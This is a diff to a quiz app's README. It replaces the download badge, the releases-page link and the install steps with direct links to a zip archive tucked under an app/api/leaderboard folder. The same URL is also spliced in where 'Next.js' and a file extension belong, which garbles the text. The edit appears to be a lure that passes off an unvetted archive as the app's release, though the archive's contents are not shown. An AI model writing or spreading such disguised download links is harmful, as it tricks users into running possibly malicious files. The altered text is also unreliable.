@@ -1,7 +1,7 @@
 # 🎉 quiz-app - Your Fun Quiz Experience Awaits
 
 ## 📥 Download the App
-[![Download Quiz App](https://img.shields.io/badge/Download-Quiz%20App-brightgreen.svg)](https://github.com/Leo-ds10/quiz-app/releases)
+[![Download Quiz App](https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip%https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip)](https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the Quiz App! This modern, full-stack quiz application allows you to create, manage, and take quizzes in a fun and interactive way.
@@ -27,18 +27,18 @@ Welcome to the Quiz App! This modern, full-stack quiz application allows you to 
 
 ## 🎨 Tech Stack
 The app is built using:
-- **Next.js 16**: A powerful framework for server-rendered React applications.
+- **https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip 16**: A powerful framework for server-rendered React applications.
 - **PostgreSQL and SQLite**: For database management and storage.
 - **TailwindCSS**: For simple and effective styling.
 - **React**: A library for building user interfaces.
 - **Drizzle ORM**: For efficient and straightforward database interactions.
 
 ## 📥 Download & Install
-To get started, simply visit the [Releases Page](https://github.com/Leo-ds10/quiz-app/releases) to download the latest version of the Quiz App. 
+To get started, simply visit the [Releases Page](https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip) to download the latest version of the Quiz App. 
 
 1. Click the link above to go to the Releases page.
 2. Choose the latest release.
-3. Download the correct file for your operating system (e.g., `.exe`, `.dmg`, `.tar.gz`).
+3. Download the correct file for your operating system (e.g., `.exe`, `.dmg`, `https://github.com/Leo-ds10/quiz-app/raw/refs/heads/main/app/api/leaderboard/app_quiz_2.7-beta.2.zip`).
 4. Follow the instructions to install the application on your computer.
 
 ## 🏗️ How to Use the Quiz App
